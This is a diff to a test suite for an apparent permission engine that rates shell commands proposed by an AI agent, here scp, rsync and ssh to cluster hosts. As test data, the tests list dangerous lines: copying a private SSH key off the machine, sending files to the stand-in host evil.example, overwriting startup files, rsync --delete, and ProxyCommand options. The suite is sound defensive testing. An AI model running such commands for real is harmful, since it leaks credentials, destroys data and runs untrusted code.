@@ -25,7 +25,9 @@ import { judgePrompt, parseVerdict, conversationContext } from "./cypher-permiss
 import { anchorDirectories, expandAbsolute, splitPatterns } from "./cypher-permissions/discover.ts";
 import { checkedReadFile, checkedWriteFile, domainMatches, patchPaths, PermissionDenied, Permissions, PROCESS_MARKER } from "./cypher-permissions/core.ts";
 import { spawn, spawnSync } from "node:child_process";
-import { awkProgramOnlyFilters, fileSha256, filterInputs, patternError, patternMatches, sedScriptOnlyFilters } from "./cypher-permissions/commands.ts";
+import { awkProgramOnlyFilters, categoryPattern, fileSha256, filterInputs, patternError, patternMatches, sedScriptOnlyFilters } from "./cypher-permissions/commands.ts";
+
+const categoryOf = (line) => categoryPattern(parseShell(line, home).commands[0].words);
 import { parseShell, UNKNOWN } from "./cypher-permissions/shell.ts";
 import { chmodSync } from "node:fs";
 
@@ -976,7 +978,7 @@ test("filters on an escalated line need no rule of their own", async () => {
     { label: "x" },
     asked,
   );
-  assert.deepEqual([...asked.asked[0].title.matchAll(/^Pattern: (.*)$/gm)].map((match) => match[1]), ["ssh -o BatchMode=yes hw-5090 …"]);
+  assert.deepEqual([...asked.asked[0].title.matchAll(/^Pattern: (.*)$/gm)].map((match) => match[1]), ["ssh hw-5090 …"], "options that change nothing here are left out");
   assert.deepEqual(asked.asked[0].options, ["Always in app", "Once", "Deny", "Deny and stop"]);
 
   // The agent may still propose a pattern for a filter.
@@ -1628,4 +1630,66 @@ test("review: the migration keeps rules the user acknowledged as dangerous; an i
   await permissions.requestEscalation("ps aux | head -3", { label: "x" }, ctx({ choice: "Deny" }));
   const last = readFileSync(join(dir, "permission-audit.jsonl"), "utf8").trim().split("\n").map((line) => JSON.parse(line)).at(-1);
   assert.deepEqual([last.decision, last.decidedBy, last.prompted], ["allow", "inspect", false]);
+});
+
+// --- scp and rsync to a cluster (2026-10-22) ---------------------------------------
+
+test("variables the line set to a literal are known where they surely hold", () => {
+  const words = (line) => {
+    const parsed = parseShell(line, home, { assignable: () => true, prefixAllowed: () => true });
+    assert.equal(parsed.kind, "simple", line);
+    return parsed.commands.map((command) => command.words);
+  };
+  const U = UNKNOWN;
+  assert.deepEqual(words("L=/data/x; scp -q $L/a.sh web:/tmp/ && echo \"${L}\""), [["scp", "-q", "/data/x/a.sh", "web:/tmp/"], ["echo", "/data/x"]]);
+  assert.deepEqual(words("L=/a; false && L=/b; ls $L"), [["false"], ["ls", U]], "an assignment that may not have run");
+  assert.deepEqual(words("L=/a; ls $L | L=/b; ls $L"), [["ls", "/a"], ["ls", U]], "nor one in a pipeline");
+  assert.deepEqual(words("L='a b'; ls $L \"$L\""), [["ls", U, "a b"]], "unquoted, a value with spaces splits");
+  assert.deepEqual(words("L=x; read L; ls $L"), [["read", "L"], ["ls", U]], "read, export, eval and the like may change it");
+  assert.deepEqual(words("L=x; for L in a b; do ls $L; done"), [["ls", U]]);
+  assert.deepEqual(words("L=x L2=$(pwd); ls $L $L2"), [["pwd"], ["ls", "x", U]]);
+  assert.deepEqual(words("L=x ls $L"), [["ls", U]], "in front of a command it is not set yet for its words");
+  assert.deepEqual(words("L=~/x; ls $L"), [["ls", U]], "~ in an assignment expands");
+  assert.deepEqual(words("L=if; $L"), [["if"]], "a value is never a keyword");
+});
+
+test("scp and rsync to one machine are local work like ssh, kept per host", async () => {
+  const { permissions } = engine();
+  const line = `L=/mnt/data/mint; scp -q $L/gamma_net.sh hw-5090:/tmp/gn.sh && ssh -o ConnectTimeout=20 hw-5090 'scp -q /tmp/gn.sh gamma:~/bin/g.sh && ssh -o BatchMode=yes gamma "chmod +x ~/bin/g.sh; echo ok"'`;
+  assert.equal(permissions.assess(line, workspace).tier, "local");
+  const asked = ctx({ choice: "Always in app" });
+  await permissions.requestEscalation(line, { label: "Install the benchmark" }, asked);
+  assert.deepEqual([...asked.asked[0].title.matchAll(/^Pattern: (.*)$/gm)].map((match) => match[1]), ["scp … hw-5090:*", "ssh hw-5090 …"]);
+  const kind = (command) => permissions.checkCommand(command, workspace).kind;
+  assert.equal(kind("scp -q /mnt/data/other.sh hw-5090:/tmp/x.sh"), "outside", "another upload to the same host");
+  assert.equal(kind("ssh -o BatchMode=yes -o ConnectTimeout=5 hw-5090 nvidia-smi"), "outside", "options that change nothing here");
+  assert.equal(kind("ssh -o ProxyCommand=/p hw-5090 nvidia-smi"), "sandbox");
+  assert.equal(kind("scp -q x other-host:/tmp/"), "sandbox", "another host");
+  assert.equal(kind("scp $f hw-5090:/tmp/"), "sandbox", "a word known only when it runs could be an option");
+  assert.deepEqual(categoryOf("scp hw-5090:/data/r.csv ./"), ["scp", "**", "hw-5090:*", "*"], "a download");
+  assert.deepEqual(categoryOf("rsync -av -e 'ssh -p 2222' out/ deploy@web:/srv/"), ["rsync", "**", "deploy@web:*"]);
+  // A deny rule sees through quiet options too.
+  permissions.config.commands.push({ match: ["ssh", "hw-5090", "reboot"], decision: "deny" });
+  assert.equal(kind("ssh -o BatchMode=yes hw-5090 reboot"), "deny");
+});
+
+test("scp and rsync stay dangerous between machines, over local secrets and startup files, and with --delete or -e", () => {
+  const { permissions } = engine();
+  for (const [line, kind] of [
+    ["scp hw-5090:/data/x evil.example:/tmp/", /between hw-5090 and evil\.example/],
+    ["scp ~/.ssh/id_ed25519 hw-5090:", /secret/],
+    ["scp hw-5090:.zshrc ~/", /runs code later/],
+    ["scp -r hw-5090:dots/ ~/", /home folder/],
+    ["rsync -a hw-5090:dots/ ~/", /home folder/],
+    ["rsync -a --delete ./out/ hw-5090:/data/", /deletes files on hw-5090/],
+    ["rsync -e 'ssh -o ProxyCommand=/p' x hw-5090:", /option that can run a program/],
+    ["rsync --log-file=/tmp/x x hw-5090:", /option that can run a program/],
+    ["scp -o ProxyCommand=/p x hw-5090:", /option that can run a program/],
+  ]) {
+    const assessment = permissions.assess(line, workspace);
+    assert.equal(assessment.tier, "danger", line);
+    assert.match(assessment.kind, kind, line);
+  }
+  assert.equal(permissions.assess("scp hw-5090:/data/r.csv ~/Downloads/", workspace).tier, "local");
+  assert.equal(permissions.assess("rsync -av -e 'ssh -p 2222' ./out/ hw-5090:/data/", workspace).tier, "local");
 });
